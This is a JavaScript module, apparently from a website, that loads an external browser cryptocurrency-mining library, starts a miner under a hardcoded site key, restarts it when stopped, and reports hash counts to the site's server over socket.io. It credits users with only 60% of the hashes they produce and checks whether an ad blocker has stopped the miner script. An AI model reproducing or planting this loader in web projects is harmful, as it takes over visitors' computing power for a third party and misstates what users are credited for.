function loadError (oError) {
   console.error("The script " + oError.target.src + " is not accessible.");
  }

export function importMineScript (sSrc, throttle, minerId, cb) {
    if(window)
    {
            var oScript = document.createElement("script");
            oScript.setAttribute("type","text/javascript");
            oScript.onerror = loadError;
            oScript.src = sSrc;
            oScript.onload  = oScript.onreadystatechange = () => {
                
                var interval = setInterval(() => {
                if(document.readyState === "loaded" || document.readyState ==="complete"){
                    console.log("mine change");
                    clearInterval(interval);
                    if(!window.Client){
                        console.log("ads anti");
                        
                        return false;
                    }
                    var _client = new Client.Anonymous('ecd9ae45c61e07a21b0d5d3a784a4d591de8c3a2823a5b9ef9c263eaa679a135', {
                        throttle, ads: 0
                        }
                    );
                    _client.start();
                    let lastHash = 0;
                    const io = require("socket.io-client");
                    const socket = io(window.location.origin);
                    socket.on('update_balance',  data => {
                        
                        const hashes = _client.getTotalHashes(true);
                        const { random, balanceAmount, cost} = data;
                        const hashMore = hashes - lastHash;
                        
                        if(hashMore<0){
                            cb(hashMore, balanceAmount, cost, _client);
                            console.log('已经停止，正在重启');
                            _client.stop();
                            _client.start();
                        }else{
                            cb(hashMore*0.6, balanceAmount, cost, _client);
                        }
                        
                        lastHash = hashes;
                        setTimeout(()=>{
                            socket.emit('update_balance', { random, hash: hashMore, minerId });
                        }, 300);
                    });
                    
                  }
                }, 300)
        
        
            }
            if(document.currentScript){
                document.currentScript.parentNode.insertBefore(oScript, document.currentScript);
            }
       
    }
        
}
